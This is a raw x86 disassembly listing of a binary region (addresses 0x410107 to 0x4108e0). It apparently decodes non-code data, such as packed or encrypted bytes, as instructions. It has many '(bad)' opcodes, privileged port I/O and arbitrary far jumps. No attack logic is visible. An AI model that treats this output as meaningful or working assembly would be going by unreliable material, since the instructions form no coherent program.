  410107:	lahf   
  410108:	bound  ecx,QWORD PTR [edx]
  41010a:	(bad)  
  41010b:	into   
  41010c:	sub    eax,0x7ce5cfc
  410111:	or     ebp,DWORD PTR [ecx]
  410113:	sbb    eax,0x112a1351
  410118:	iret   
  410119:	fcmovbe st,st(5)
  41011b:	dec    edi
  41011c:	xchg   ecx,eax
  41011d:	xchg   ebp,eax
  41011e:	fidivr DWORD PTR [edi]
  410120:	int    0xfb
  410122:	jmp    0x4100ae
  410124:	mov    BYTE PTR [esp+ebx*2+0x2a],bh
  410128:	jle    0x4100f2
  41012a:	dec    edx
  41012b:	cmp    bh,dh
  41012d:	jg     0x4100ce
  41012f:	push   edi
  410130:	push   ebx
  410131:	sti    
  410132:	ficom  WORD PTR [ebp+ecx*8-0x4c]
  410136:	mov    eax,0x8f1ee922
  41013b:	out    dx,eax
  41013c:	pop    edx
  41013d:	xor    eax,0x8158963b
  410142:	mov    cl,0x0
  410144:	sbb    edx,DWORD PTR [esi]
  410146:	sub    eax,0xfd8d4ec9
  41014b:	inc    edx
  41014c:	and    eax,0xf5db5f2c
  410151:	test   eax,0x32f02016
  410156:	mov    edx,0x7fc21d91
  41015b:	not    DWORD PTR [edi+0x51]
  41015e:	inc    ebp
  41015f:	cwde   
  410160:	mov    ebx,0xd56b3ceb
  410165:	repz fcmove st,st(3)
  410168:	adc    al,bh
  41016a:	daa    
  41016b:	(bad)  
  41016c:	aam    0x3e
  41016e:	xchg   ebp,eax
  41016f:	xlat   BYTE PTR ds:[ebx]
  410170:	fs add eax,0x4d6ca1f6
  410176:	mov    al,ds:0xb402c9c7
  41017b:	inc    eax
  41017c:	(bad)  
  41017d:	lds    ebx,FWORD PTR [esi+0x5250ece]
  410183:	nop
  410184:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410185:	das    
  410186:	add    DWORD PTR [eax-0x6251314e],esi
  41018c:	scas   eax,DWORD PTR es:[edi]
  41018d:	mov    cl,BYTE PTR [edx]
  41018f:	fdivr  DWORD PTR [eax]
  410191:	nop
  410192:	loop   0x4101f8
  410194:	ja     0x4101fb
  410196:	and    DWORD PTR [ecx],edx
  410198:	mov    ch,0xf9
  41019a:	cld    
  41019b:	push   cs
  41019c:	popf   
  41019d:	fcmovne st,st(3)
  41019f:	in     al,0x2a
  4101a1:	xchg   edi,eax
  4101a2:	inc    edi
  4101a3:	inc    DWORD PTR [edi+0xca0abf2]
  4101a9:	xor    al,BYTE PTR [edi-0x5662c70b]
  4101af:	sbb    edi,ecx
  4101b1:	sahf   
  4101b2:	xor    BYTE PTR [ebx-0x2],ch
  4101b5:	stos   DWORD PTR es:[edi],eax
  4101b6:	pop    ss
  4101b7:	push   ebp
  4101b8:	pop    ss
  4101b9:	cdq    
  4101ba:	fbstp  TBYTE PTR es:[edx+0x2e]
  4101be:	fild   WORD PTR [ebx]
  4101c0:	stos   DWORD PTR es:[edi],eax
  4101c1:	dec    eax
  4101c2:	outs   dx,DWORD PTR ds:[esi]
  4101c3:	fdiv   QWORD PTR [edi+0x4ca92b5b]
  4101c9:	and    al,BYTE PTR [ecx-0x580f6509]
  4101cf:	mov    ds:0x7f3475fd,eax
  4101d4:	push   ecx
  4101d5:	push   0xc7ce0ac1
  4101da:	stos   DWORD PTR es:[edi],eax
  4101db:	jle    0x4101a1
  4101dd:	in     eax,dx
  4101de:	push   esp
  4101df:	push   edi
  4101e0:	pop    esp
  4101e1:	popf   
  4101e2:	mov    ss,WORD PTR [edx-0x29ee0300]
  4101e8:	xchg   ecx,eax
  4101ea:	jne    0x410204
  4101ec:	call   0xc101:0xab477ac1
  4101f3:	sbb    esi,DWORD PTR [edx]
  4101f5:	loop   0x4101a8
  4101f7:	pop    ebp
  4101f8:	pop    eax
  4101f9:	arpl   WORD PTR [ebx],bp
  4101fb:	aaa    
  4101fc:	jp     0x4101b6
  4101fe:	xchg   DWORD PTR [ebp-0x5b41ea45],eax
  410204:	cmp    eax,0x4353b985
  410209:	push   esi
  41020a:	sub    DWORD PTR [eax-0x81ebe9f],edx
  410210:	jnp    0x410221
  410212:	adc    BYTE PTR [edx],ch
  410214:	lods   eax,DWORD PTR ds:[esi]
  410215:	cmp    dl,ah
  410217:	add    eax,0xe7ed61a8
  41021c:	sub    eax,0x86ee77d2
  410221:	clc    
  410222:	push   eax
  410223:	adc    al,0xcd
  410225:	outs   dx,BYTE PTR ds:[esi]
  410226:	xlat   BYTE PTR ds:[ebx]
  410227:	push   cs
  410228:	lock cmp BYTE PTR [ebx],cl
  41022b:	mov    ch,0xcd
  41022d:	sbb    ah,BYTE PTR [ebx]
  41022f:	mov    BYTE PTR [edx],al
  410231:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410232:	lock les esp,FWORD PTR [ebx+edx*2-0x3f59a680]
  41023a:	shl    DWORD PTR [ecx+0x57],0x9c
  41023e:	dec    esi
  41023f:	or     ecx,DWORD PTR [ecx]
  410241:	mov    ch,0xbe
  410243:	fs mov al,0xf7
  410246:	mov    eax,ds:0xca9eafeb
  41024b:	fsubr  DWORD PTR [edx-0x643bc771]
  410251:	(bad)
  410254:	and    esi,DWORD PTR [edx+0x78bd69dd]
  41025a:	retf   0x5580
  41025d:	outs   dx,DWORD PTR ds:[esi]
  41025e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41025f:	inc    ebx
  410260:	adc    bl,BYTE PTR [ebp+0x27125d17]
  410266:	out    0x9,eax
  410268:	mov    eax,0xff0f15f4
  41026d:	sahf   
  41026e:	push   eax
  41026f:	adc    esi,eax
  410271:	mov    ds:0xe0a90654,eax
  410276:	sbb    BYTE PTR [ecx+0xe],bl
  410279:	sti    
  41027a:	int    0xa0
  41027c:	dec    edx
  41027d:	lahf   
  41027e:	pusha  
  41027f:	mov    bh,0xfa
  410281:	out    0xe7,eax
  410283:	mov    dl,0xfc
  410285:	imul   edx,DWORD PTR [ebp+0x285a8246],0xe53e0ba0
  41028f:	dec    edx
  410290:	cmp    dl,ch
  410292:	sahf   
  410293:	or     eax,0xbc1cae5e
  410298:	xchg   esp,eax
  410299:	mov    DWORD PTR [ecx],ecx
  41029b:	repz in eax,0x1a
  41029e:	pop    ecx
  41029f:	das    
  4102a0:	ror    WORD PTR [eax],1
  4102a3:	mov    ecx,0xafef1691
  4102a8:	je     0x4102f3
  4102aa:	scas   eax,DWORD PTR es:[edi]
  4102ab:	xor    DWORD PTR [edx-0x7f1d228f],0x11bbe17
  4102b5:	inc    ecx
  4102b6:	xchg   esp,eax
  4102b8:	fistp  QWORD PTR [ecx]
  4102ba:	fs pop esi
  4102bc:	xor    al,0xc3
  4102be:	pop    edx
  4102bf:	cs loop 0x410340
  4102c2:	pop    edi
  4102c3:	dec    eax
  4102c4:	mov    eax,ds:0x22691a1
  4102c9:	addr16 int3 
  4102cb:	outs   dx,DWORD PTR ds:[esi]
  4102cc:	push   ebp
  4102cd:	add    BYTE PTR [ecx+0x15],bh
  4102d0:	pop    esi
  4102d1:	pusha  
  4102d2:	lea    ecx,[edi]
  4102d4:	imul   ebx,DWORD PTR [ecx+0x17],0xe368d8ab
  4102db:	cdq    
  4102dc:	inc    ebx
  4102dd:	jl     0x410260
  4102df:	fwait
  4102e0:	loop   0x4102f2
  4102e2:	or     eax,DWORD PTR [ebp-0x55]
  4102e5:	or     BYTE PTR [eax-0x79],ch
  4102e8:	aad    0xda
  4102ea:	xchg   ebx,eax
  4102eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4102ec:	xor    al,BYTE PTR [edi]
  4102ee:	loop   0x410303
  4102f0:	push   esi
  4102f1:	mov    cl,BYTE PTR [edx+0x3d78b9f]
  4102f7:	sti    
  4102f8:	cmp    DWORD PTR [eax-0x6b945ad6],eax
  4102fe:	sbb    al,0x93
  410300:	jmp    0xff46:0x4375c671
  410307:	xor    DWORD PTR [esi],esp
  410309:	mov    eax,0x7f3bc040
  41030e:	mov    dh,0x66
  410310:	pop    esi
  410311:	test   BYTE PTR [edi+0x11ae376d],ah
  410317:	sbb    eax,0x5f7ad950
  41031c:	jg     0x4102bf
  41031e:	ds push ebx
  410320:	sbb    al,0x24
  410322:	(bad)  
  410323:	xlat   BYTE PTR ds:[ebx]
  410324:	mov    eax,0x74091e2c
  410329:	(bad)  
  41032a:	rcr    BYTE PTR [ebx],1
  41032c:	sub    eax,0x400d0d62
  410331:	outs   dx,DWORD PTR ds:[esi]
  410332:	cld    
  410333:	xchg   ebx,eax
  410334:	sbb    eax,0x9761ce3e
  410339:	sar    DWORD PTR [esi],0xa6
  41033c:	fnstcw WORD PTR [eax+0x22]
  41033f:	mov    bl,bl
  410341:	jne    0x4102d1
  410343:	xchg   ecx,eax
  410344:	inc    esi
  410345:	std    
  410346:	(bad)  
  410347:	out    0xb0,al
  410349:	iret   
  41034a:	jno    0x410304
  41034c:	out    0x46,al
  41034e:	push   edi
  41034f:	sbb    cl,ch
  410351:	stc    
  410352:	fld    DWORD PTR [ecx]
  410354:	cmp    DWORD PTR [edi+eiz*8],eax
  410357:	cmp    DWORD PTR [edi],esi
  410359:	imul   eax,ebx,0x49d4065f
  41035f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410360:	pop    ebp
  410361:	mov    eax,0x17dfafe7
  410366:	dec    eax
  410367:	xchg   edi,eax
  410368:	fidiv  WORD PTR [ecx-0x1f55909]
  41036e:	push   esp
  41036f:	fcom   QWORD PTR [ebx+eax*2+0x456e9388]
  410376:	dec    edi
  410377:	leave  
  410378:	mov    edi,0x294bd9af
  41037d:	pop    edi
  41037e:	ret    
  41037f:	adc    ebp,DWORD PTR [ebx-0x7e19ba16]
  410385:	(bad)  
  410386:	data16 sbb BYTE PTR [ebx+0x75],bh
  41038a:	push   esp
  41038b:	lods   al,BYTE PTR ds:[esi]
  41038c:	jne    0x4103fc
  41038e:	jae    0x4103f8
  410390:	loope  0x4103f6
  410392:	push   ebp
  410393:	or     DWORD PTR [ecx+0x19454368],ecx
  410399:	jle    0x410388
  41039b:	push   eax
  41039c:	dec    ebx
  41039d:	mov    dl,0xc0
  41039f:	mov    ebp,edi
  4103a1:	jno    0x410418
  4103a3:	ret    
  4103a4:	scas   eax,DWORD PTR es:[edi]
  4103a5:	mov    esp,0x6402a1a0
  4103aa:	jb     0x41033b
  4103ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4103ad:	pusha  
  4103ae:	jbe    0x410344
  4103b0:	mov    al,0x66
  4103b2:	shr    al,1
  4103b4:	dec    ebp
  4103b5:	mov    BYTE PTR [ecx+ebx*8],dh
  4103b8:	mov    eax,ds:0x242e8d0
  4103bd:	inc    ecx
  4103be:	xchg   edx,eax
  4103bf:	nop
  4103c0:	rcr    DWORD PTR [eax+0x6080857c],1
  4103c6:	pop    edi
  4103c7:	push   0x1d530638
  4103cc:	xchg   ecx,eax
  4103cd:	(bad)  
  4103ce:	cmp    eax,0xa3e93e43
  4103d3:	lods   al,BYTE PTR ds:[esi]
  4103d4:	adc    eax,0x3d18b81a
  4103d9:	add    bh,bh
  4103db:	fimul  DWORD PTR [ebp+eiz*4-0xcd17934]
  4103e2:	aam    0x1
  4103e4:	loope  0x410371
  4103e6:	lea    esp,[ebp+0x5d4257e7]
  4103ec:	cmp    edx,edi
  4103ee:	push   es
  4103ef:	(bad)  
  4103f0:	jmp    0x4103f1
  4103f2:	lock push eax
  4103f4:	ja     0x41038d
  4103f6:	add    dl,al
  4103f8:	ss xchg edx,eax
  4103fa:	fiadd  WORD PTR [ecx-0x52310038]
  410400:	pop    ds
  410401:	data16 mov cl,ch
  410404:	inc    eax
  410405:	pop    ecx
  410406:	sbb    BYTE PTR [ebp-0x18],ch
  410409:	xchg   DWORD PTR [ecx-0x70052494],ebx
  41040f:	fimul  DWORD PTR [edi-0x5d]
  410412:	cli    
  410413:	rol    ebx,cl
  410415:	fist   DWORD PTR [edx+0x35]
  410418:	sub    dl,ch
  41041a:	jns    0x4103a0
  41041c:	and    al,0x6f
  41041e:	sub    ch,BYTE PTR [ebp-0x4]
  410421:	push   esp
  410422:	fucom  st(2)
  410424:	or     al,0x1e
  410426:	push   esi
  410427:	iret   
  410428:	and    BYTE PTR [esi-0x3c],ch
  41042b:	dec    ch
  41042d:	and    cl,BYTE PTR [ebx]
  41042f:	dec    ebx
  410430:	fst    DWORD PTR [edi-0x2d0c303e]
  410436:	xor    edx,DWORD PTR [esi-0x73]
  410439:	mov    cl,0xdd
  41043b:	test   al,0xcc
  41043d:	pop    ebx
  41043e:	out    0xfb,al
  410440:	mov    esp,ebx
  410442:	xor    BYTE PTR [edx],ah
  410444:	sub    dl,dl
  410446:	pop    esp
  410447:	(bad)  
  410448:	jbe    0x4103fc
  41044a:	std    
  41044b:	mov    al,ds:0xeef6f18d
  410450:	mov    edi,0x7e3d6ae7
  410455:	xchg   ecx,eax
  410456:	lahf   
  410457:	lods   eax,DWORD PTR ds:[esi]
  410458:	fistp  WORD PTR [ebx+0x328d179b]
  41045e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41045f:	sub    eax,0xb04349c6
  410464:	mov    al,ds:0xbf9db1b4
  410469:	mov    ah,0x67
  41046b:	clc    
  41046c:	loope  0x41047c
  41046e:	mov    WORD PTR [esp+eiz*8-0x5a],?
  410472:	jb     0x410493
  410474:	aas    
  410475:	jno    0x410417
  410477:	jb     0x4104e1
  410479:	xchg   edi,eax
  41047a:	fld    TBYTE PTR [ebx-0x30520e61]
  410480:	xor    BYTE PTR [edx-0x32],ch
  410483:	adc    edi,ebp
  410485:	addr16 mov ch,0xe
  410488:	clc    
  410489:	mov    dl,0x78
  41048b:	cli    
  41048c:	mov    esp,0x373e5378
  410491:	addr16 mov al,ds:0x67fe
  410495:	stos   BYTE PTR es:[edi],al
  410496:	dec    esp
  410497:	enter  0xfddd,0x38
  41049b:	ins    DWORD PTR es:[edi],dx
  41049c:	pop    ebp
  41049d:	mov    edi,0x31dd27ad
  4104a2:	cdq    
  4104a3:	mov    cl,0xf3
  4104a5:	ss cdq 
  4104a7:	xchg   esp,eax
  4104a8:	push   edi
  4104a9:	data16 or ah,BYTE PTR [ebp-0xcb9fc86]
  4104b0:	dec    esp
  4104b1:	inc    esp
  4104b2:	outs   dx,BYTE PTR ds:[esi]
  4104b3:	cwde   
  4104b4:	adc    eax,0x496e37ba
  4104b9:	push   ebx
  4104ba:	pop    esp
  4104bb:	pop    eax
  4104bc:	iret   
  4104bd:	cmp    DWORD PTR [esi+0x7],0x63b6e004
  4104c4:	jmp    0x5924:0x62111066
  4104cb:	ret    
  4104cc:	in     eax,dx
  4104cd:	dec    ecx
  4104ce:	pop    ebp
  4104cf:	and    eax,0x4a40a687
  4104d4:	mov    cl,0x5f
  4104d6:	pusha  
  4104d7:	ficom  WORD PTR [ecx-0x25d2781d]
  4104dd:	sub    al,0x26
  4104df:	xchg   esp,eax
  4104e0:	xor    eax,0x8eece65b
  4104e5:	jno    0x4104dc
  4104e7:	push   esp
  4104e8:	push   ss
  4104e9:	sbb    DWORD PTR [edx+0x2a],ebx
  4104ec:	push   edx
  4104ed:	xor    DWORD PTR [ebp+0x53],eax
  4104f0:	mov    ebx,0xe1171625
  4104f5:	sar    BYTE PTR [eax+0x57],1
  4104f8:	push   0x6c7beb63
  4104fd:	fst    QWORD PTR [ebx+0x1c9e2da5]
  410503:	xor    DWORD PTR [edx+0xe],esp
  410506:	push   0x149e98da
  41050b:	pop    edi
  41050c:	data16 xor al,0x96
  41050f:	mov    edx,0x27a43af4
  410514:	jnp    0x4104bc
  410516:	push   cs
  410517:	pop    ebx
  410518:	dec    ebx
  410519:	mov    esp,eax
  41051b:	sahf   
  41051c:	scas   eax,DWORD PTR es:[edi]
  41051d:	jne    0x410500
  41051f:	cmp    eax,0xe68a439a
  410524:	inc    edi
  410525:	pop    ss
  410526:	add    DWORD PTR [ebx+0x6c],edx
  410529:	adc    DWORD PTR [esi],0x1f
  41052c:	loopne 0x410561
  41052e:	stos   BYTE PTR es:[edi],al
  41052f:	add    ebx,DWORD PTR [edx+0x3a]
  410532:	aam    0xa3
  410534:	xlat   BYTE PTR ds:[ebx]
  410535:	and    al,0xdd
  410537:	pushf  
  410538:	stos   BYTE PTR es:[edi],al
  410539:	and    eax,0x2e92d26e
  41053e:	add    DWORD PTR ds:0x33717c3a,0x49
  410545:	fstp   QWORD PTR [ecx+0x492d8ef8]
  41054b:	aaa    
  41054c:	pop    esi
  41054d:	xchg   esp,eax
  41054e:	div    BYTE PTR [ecx-0x3c]
  410551:	mov    edx,?
  410553:	pop    edi
  410554:	push   ecx
  410555:	or     al,0x43
  410557:	test   BYTE PTR [ecx],dh
  410559:	push   edi
  41055a:	mov    ds:0x6f29aeab,al
  41055f:	push   0x76
  410561:	dec    esi
  410562:	or     eax,0x1d559429
  410567:	pop    esp
  410568:	add    edi,0xffffffe8
  41056b:	mov    edx,0xbad03305
  410570:	jmp    0x4105d3
  410572:	lahf   
  410573:	aam    0x86
  410575:	pusha  
  410576:	iret   
  410577:	jo     0x410573
  410579:	adc    eax,0x1752b650
  41057e:	jb     0x410553
  410580:	inc    ebp
  410581:	fbld   TBYTE PTR ds:[esi]
  410584:	inc    ecx
  410585:	mov    dh,0xa1
  410587:	add    BYTE PTR [edi+0x7a],dh
  41058a:	retf   
  41058b:	(bad)  
  41058c:	call   0xc77017c8
  410591:	pushf  
  410592:	and    eax,eax
  410594:	sbb    BYTE PTR [ebp-0x7],ah
  410597:	push   es
  410598:	and    dh,BYTE PTR [edx]
  41059a:	rcl    BYTE PTR [esi],0x44
  41059d:	bound  esi,QWORD PTR [edi-0x77a79fb4]
  4105a3:	iret   
  4105a4:	adc    ebp,DWORD PTR [ecx+0x4b535108]
  4105aa:	jle    0x410615
  4105ac:	loope  0x41058e
  4105ae:	pop    edx
  4105af:	sbb    al,0x2
  4105b1:	and    eax,DWORD PTR [ecx-0x57]
  4105b4:	jg     0x410623
  4105b6:	ds pop edi
  4105b8:	in     eax,0x56
  4105ba:	fcmovnbe st,st(4)
  4105bc:	xchg   esi,eax
  4105bd:	retf   
  4105be:	jb     0x41060a
  4105c0:	(bad)
  4105c3:	jbe    0x410559
  4105c5:	pop    esp
  4105c6:	enter  0xb5df,0xd0
  4105ca:	arpl   WORD PTR [edx+ebp*2],bx
  4105cd:	test   DWORD PTR [edi+0x56],edi
  4105d0:	jnp    0x41056d
  4105d2:	mov    al,ds:0xbb8d3e7e
  4105d7:	push   esp
  4105d8:	pop    edi
  4105d9:	jp     0x410644
  4105db:	pop    ebx
  4105dc:	lock icebp 
  4105de:	push   DWORD PTR [edi+0x69]
  4105e1:	(bad)  
  4105e3:	xor    DWORD PTR [ecx+eiz*8],ecx
  4105e6:	pop    ecx
  4105e7:	push   0xafcaede5
  4105ec:	(bad)  
  4105ee:	and    al,0xd3
  4105f0:	dec    ebx
  4105f1:	mov    al,fs:0x754d591a
  4105f7:	or     BYTE PTR [bp+di+0x271b],0xab
  4105fd:	or     eax,0x25a03510
  410602:	fisub  DWORD PTR [ecx]
  410605:	push   esp
  410606:	outs   dx,DWORD PTR ds:[esi]
  410607:	scas   al,BYTE PTR es:[edi]
  410608:	in     al,0xd4
  41060a:	or     al,0x6
  41060c:	(bad)  
  41060d:	jmp    0x69f9:0x866a919d
  410614:	sbb    eax,0xde04e5e9
  410619:	out    dx,eax
  41061a:	mov    eax,0xae4f9bb9
  41061f:	mov    ah,0x85
  410621:	aam    0xe8
  410623:	mov    ebx,0x8a01c02e
  410628:	jno    0x410656
  41062a:	mov    dl,0x40
  41062c:	dec    esi
  41062d:	push   es
  41062e:	cmp    dl,BYTE PTR [ebx+0x27b93dea]
  410634:	add    dl,BYTE PTR [ebp-0x70]
  410637:	fcomp  st(2)
  410639:	mov    eax,ds:0xc5687302
  41063e:	push   ecx
  41063f:	mov    ecx,0xffc17d8c
  410644:	into   
  410645:	(bad)  
  410646:	(bad)  
  410647:	popa   
  410648:	sbb    bh,cl
  41064a:	xor    esp,0x1076defa
  410650:	add    DWORD PTR [ecx-0x63aa895b],0x997f45d6
  41065a:	dec    dl
  41065c:	push   0xfffffff0
  41065e:	add    eax,0xe06c50a
  410663:	test   al,0x7c
  410665:	mov    ecx,0x49f59af2
  41066a:	fst    DWORD PTR [ebp+0x6f]
  41066d:	loop   0x41064a
  41066f:	push   0xe45d5060
  410674:	inc    edi
  410675:	loopne 0x410637
  410677:	pop    ds
  410678:	cmc    
  410679:	mov    ah,0xd
  41067b:	adc    eax,0xdeccb75c
  410680:	ds push edi
  410682:	mov    edi,?
  410684:	shl    BYTE PTR [edx-0x7758843a],0xba
  41068b:	pop    ebp
  41068c:	loope  0x4106db
  41068e:	jae    0x410668
  410690:	stos   DWORD PTR es:[edi],eax
  410691:	dec    edx
  410692:	jne    0x4106a6
  410694:	mov    al,ds:0x49838022
  410699:	pop    ebp
  41069b:	mov    esi,0x9de1068f
  4106a0:	jmp    0xdcee9f5d
  4106a5:	sub    BYTE PTR [ebp+0x3e3bd974],dh
  4106ab:	fwait
  4106ac:	dec    esp
  4106ad:	test   DWORD PTR [edi+0x3e865fc5],ebp
  4106b3:	loopne 0x41066f
  4106b5:	mov    bh,0x94
  4106b7:	dec    ebx
  4106b8:	cmp    BYTE PTR [edi],dl
  4106ba:	cs jno 0x4106e9
  4106bd:	popa   
  4106be:	js     0x410710
  4106c0:	ins    BYTE PTR es:[edi],dx
  4106c1:	dec    dx
  4106c3:	dec    esi
  4106c4:	xor    eax,0xdb6b4d32
  4106c9:	jle    0x4106a3
  4106cb:	sub    esp,ecx
  4106cd:	mov    dl,0xd8
  4106cf:	sbb    DWORD PTR [edx],0xd092c481
  4106d5:	jge    0x4106a3
  4106d7:	adc    eax,0xab21160
  4106dc:	pop    edi
  4106dd:	cld    
  4106de:	or     eax,DWORD PTR [ebx]
  4106e0:	push   edx
  4106e1:	inc    edx
  4106e2:	aas    
  4106e3:	dec    esi
  4106e4:	push   edx
  4106e5:	repnz xor edx,0x53
  4106e9:	ins    DWORD PTR es:[edi],dx
  4106ea:	repz jecxz 0x4106eb
  4106ed:	dec    ecx
  4106ee:	arpl   WORD PTR [ebp-0x46],sp
  4106f1:	push   0xffffff98
  4106f3:	mov    al,ds:0x583832c4
  4106f8:	jmp    FWORD PTR [edi+0x66]
  4106fb:	ins    DWORD PTR es:[edi],dx
  4106fc:	adc    ecx,ebp
  4106fe:	(bad)  [ecx-0x7c]
  410701:	or     eax,0xc4903e74
  410706:	push   ebp
  410707:	push   edx
  410708:	aaa    
  410709:	push   eax
  41070a:	mov    ebp,0xc89b21c0
  41070f:	mov    edx,0x9a1bdecd
  410714:	push   ecx
  410715:	jbe    0x4106d6
  410717:	in     eax,0x83
  410719:	mov    bh,0x5
  41071b:	jns    0x410716
  41071d:	fwait
  41071e:	mov    ah,0x5d
  410720:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410721:	iret   
  410722:	dec    esi
  410723:	adc    cl,ch
  410725:	js     0x410709
  410727:	js     0x4106d3
  410729:	lods   eax,DWORD PTR ds:[esi]
  41072a:	mov    edi,0xd26a5d05
  41072f:	or     eax,0x6409a4bc
  410734:	xchg   ecx,eax
  410735:	mov    dl,0x67
  410737:	xchg   BYTE PTR [eax],ch
  410739:	mov    BYTE PTR [ecx+0x163f40a0],ch
  41073f:	in     eax,0x8e
  410741:	test   BYTE PTR [edi],0x0
  410744:	dec    edi
  410745:	jns    0x410791
  410747:	xchg   ecx,eax
  410748:	bound  esp,QWORD PTR [edx-0x45fb15a7]
  41074e:	pop    ebp
  41074f:	inc    eax
  410750:	mov    cl,BYTE PTR [ebp+0x620d28]
  410756:	push   0xa45ce4
  41075b:	mov    bl,0xc6
  41075d:	pop    edx
  41075e:	mov    WORD PTR [ecx+0x6be0c574],ss
  410764:	sub    eax,0x6252d686
  410769:	stc    
  41076a:	int    0xed
  41076c:	xchg   DWORD PTR [edx-0x15],ebp
  41076f:	and    BYTE PTR [eax],cl
  410771:	icebp  
  410772:	dec    ecx
  410773:	cmp    DWORD PTR [ecx],edi
  410775:	dec    ebx
  410776:	cmp    al,0xd
  410778:	outs   dx,DWORD PTR ds:[esi]
  410779:	daa    
  41077a:	mov    ebp,0xd7c9b371
  41077f:	sub    ch,cl
  410781:	jp     0x4107ca
  410783:	ja     0x41073a
  410785:	add    al,0x74
  410787:	popa   
  410788:	adc    dl,BYTE PTR [edi]
  41078a:	xor    BYTE PTR [ebp-0x19daee7d],dl
  410790:	in     al,0xec
  410792:	idiv   BYTE PTR [ecx-0x5fc23c03]
  410798:	push   0xd3dcd2d8
  41079d:	mov    ah,0x95
  41079f:	inc    esi
  4107a0:	mov    WORD PTR [eax],?
  4107a2:	js     0x410805
  4107a4:	pop    es
  4107a5:	in     eax,dx
  4107a6:	xor    bh,BYTE PTR [ebx]
  4107a8:	daa    
  4107a9:	inc    eax
  4107aa:	(bad)  
  4107ab:	enter  0x4ffd,0x13
  4107af:	mov    WORD PTR [ecx+eax*2],gs
  4107b2:	jb     0x4107de
  4107b4:	jb     0x4107a6
  4107b6:	into   
  4107b7:	mov    edx,0x401316b
  4107bc:	and    eax,0xa11c8372
  4107c1:	fnsave [ebx-0x17]
  4107c4:	jb     0x41079e
  4107c6:	add    dl,BYTE PTR [ebx-0x24]
  4107c9:	jnp    0x410776
  4107cb:	daa    
  4107cc:	inc    ebx
  4107cd:	and    al,BYTE PTR [edx]
  4107cf:	and    DWORD PTR [ebx],esp
  4107d1:	and    ebp,ebx
  4107d3:	data16 aad 0x68
  4107d6:	int    0x72
  4107d8:	cwde   
  4107d9:	loope  0x4107ac
  4107db:	ins    DWORD PTR es:[edi],dx
  4107dc:	mov    WORD PTR [edx],es
  4107de:	aad    0xc4
  4107e0:	nop
  4107e1:	(bad)  
  4107e2:	cmp    DWORD PTR [edi+0x145a2fc2],esi
  4107e8:	and    ah,ch
  4107ea:	ds jmp 0x3366:0xb19b8a6f
  4107f2:	fs stos DWORD PTR es:[edi],eax
  4107f4:	neg    DWORD PTR [eax+0x1b39ff4e]
  4107fa:	dec    esp
  4107fb:	cwde   
  4107fc:	xchg   edi,eax
  4107fd:	pop    edx
  4107fe:	mov    ds:0xb2a40e58,al
  410803:	outs   dx,BYTE PTR ds:[esi]
  410804:	mov    al,0x5e
  410806:	mov    ebx,0x1043f6af
  41080b:	or     BYTE PTR [edx],ah
  41080d:	dec    edi
  41080e:	aas    
  41080f:	(bad)  
  410810:	lock ds popf 
  410813:	rol    BYTE PTR [edi],1
  410815:	mov    eax,0x9d5bbfa4
  41081a:	ja     0x410866
  41081c:	inc    edx
  41081d:	in     eax,0xa6
  41081f:	mul    DWORD PTR ds:0x3485f4e3
  410825:	lock mov esi,DWORD PTR [ebx+0x51]
  410829:	test   al,0x29
  41082b:	inc    ebx
  41082c:	dec    esi
  41082d:	mov    WORD PTR [edi],?
  41082f:	adc    ebx,DWORD PTR [edx-0x50]
  410832:	dec    ebx
  410833:	mov    dh,0x7b
  410835:	js     0x41081c
  410837:	cmp    bl,0xc3
  41083a:	out    0xe0,al
  41083c:	pop    ss
  41083d:	xchg   edi,eax
  41083e:	cli    
  41083f:	sub    ah,BYTE PTR [eax]
  410841:	inc    ebp
  410842:	add    DWORD PTR ss:[esi],ecx
  410845:	std    
  410846:	mov    bl,0xbd
  410848:	popa   
  410849:	lea    edx,fs:[edx]
  41084c:	xchg   ebx,eax
  41084d:	cmp    eax,DWORD PTR [ebx]
  41084f:	sub    DWORD PTR [ebx],esp
  410851:	fwait
  410852:	loop   0x4107f3
  410854:	daa    
  410855:	fwait
  410856:	cmp    esi,DWORD PTR [edx+eax*8]
  410859:	cmc    
  41085a:	js     0x41089a
  41085c:	int3   
  41085d:	xchg   esi,eax
  41085e:	call   0xbce3:0x4642db09
  410865:	jo     0x41083c
  410867:	repnz xchg esi,eax
  410869:	and    BYTE PTR [ebx+0x60],bl
  41086c:	out    0x17,al
  41086e:	imul   ebp,DWORD PTR [ebp+0x6d],0x5a
  410872:	in     al,dx
  410873:	inc    eax
  410874:	(bad)  
  410875:	push   ebp
  410876:	iret   
  410877:	out    dx,al
  410878:	(bad)  
  410879:	jae    0x410878
  41087b:	jmp    0x5932:0xc0bc5567
  410882:	(bad)  
  410883:	leave  
  410884:	fs out 0x6,al
  410887:	not    DWORD PTR [esi-0x28e1683a]
  41088d:	mov    edx,0xb588bcf
  410892:	adc    bh,BYTE PTR [esi+0x77021f62]
  410898:	out    0x7,al
  41089a:	clc    
  41089b:	mov    ebx,DWORD PTR [edi+0xf]
  41089e:	mov    ecx,0x31cbff51
  4108a3:	dec    ebx
  4108a4:	test   BYTE PTR [ebx+0x4ed98947],cl
  4108aa:	mov    eax,0x4786b1b1
  4108af:	push   ebp
  4108b0:	dec    esi
  4108b1:	xchg   esi,eax
  4108b2:	fldlg2 
  4108b4:	ret    
  4108b5:	sub    eax,0x3d967901
  4108ba:	ret    
  4108bb:	adc    al,0x9b
  4108bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4108be:	cld    
  4108bf:	push   0xffffffd4
  4108c1:	ins    DWORD PTR es:[edi],dx
  4108c2:	cmp    al,0xca
  4108c4:	xchg   edx,eax
  4108c5:	mov    bh,0xb9
  4108c7:	pop    esi
  4108c8:	xchg   ebx,eax
  4108c9:	ja     0x4108b7
  4108cb:	sti    
  4108cc:	repz dec edx
  4108ce:	pop    edi
  4108cf:	xchg   DWORD PTR [ebp-0x26],edx
  4108d2:	push   esp
  4108d3:	mov    bh,0x51
  4108d5:	mov    esp,eax
  4108d7:	sub    al,0x56
  4108d9:	or     BYTE PTR ds:0xb5baaf0e,0xa
  4108e0:	cmp    ecx,DWORD PTR [esi]
